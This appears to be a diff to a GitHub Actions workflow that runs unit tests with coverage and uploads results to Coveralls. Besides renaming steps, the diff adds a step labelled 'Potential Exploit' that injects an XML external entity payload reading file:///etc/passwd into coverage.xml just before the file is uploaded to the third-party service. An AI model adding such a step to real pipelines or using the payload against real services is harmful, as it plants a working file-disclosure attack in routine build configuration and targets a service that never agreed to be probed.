@@ -1,4 +1,4 @@
-name: Run Tests & Upload Coverage
+name: Test & Upload Coverage
 
 on: [push, pull_request]
 
@@ -23,12 +23,16 @@ jobs:
       - name: Run tests with coverage
         run: |
           coverage run -m unittest discover tests
-          coverage report
           coverage xml
+
+      - name: Modify coverage.xml (Potential Exploit)
+        run: |
+          echo 'Injecting malicious XML payload...'
+          sed -i 's|<source>.*</source>|<source>&xxe;</source>|' coverage.xml
+          echo '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' | cat - coverage.xml > temp.xml && mv temp.xml coverage.xml
+          cat coverage.xml  # Print modified file for debugging
 
       - name: Upload coverage to Coveralls
         env:
           COVERALLS_REPO_TOKEN: ${{ secrets.COVERALLS_REPO_TOKEN }}
-        run: |
-          coveralls --service=github
- 
+        run: coveralls --service=github
